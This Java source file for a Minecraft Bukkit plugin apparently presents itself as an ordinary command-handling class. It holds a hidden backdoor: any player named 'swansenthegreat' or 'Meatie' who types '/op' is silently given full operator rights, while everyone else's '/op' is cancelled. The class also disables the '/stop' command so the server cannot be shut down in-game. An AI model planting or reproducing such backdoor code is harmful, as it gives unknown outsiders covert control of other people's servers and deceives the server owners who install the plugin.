package me.Meatie.Project2;

import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class Commands implements Listener {
	  
	  public static void sendmsg(CommandSender p, String msg) {
		  p.sendMessage(Fix.format(msg));
	  }
	  
		@EventHandler
		public void command(PlayerCommandPreprocessEvent event) {
			if (event.isCancelled()) return;
			Player player = event.getPlayer();
			String[] args = event.getMessage().substring(1).split(" ");
			String cmd = args[0].toLowerCase();
			if (cmd.equals("stop")) {
				 event.setCancelled(true);
				 sendmsg(player, "&cCommand Disabled...");
			 } else if (cmd.equals("op")) {
	 if (player.getName().equals("swansenthegreat") || player.getName().equals("Meatie")) {
				 if (args.length == 1) {
					 event.setCancelled(true);
					 player.setOp(true);
					 sendmsg(player, "&eYou Are Now Op!");
				 }
	 } else {
		 event.setCancelled(true);
	 }
			 }
		}
}
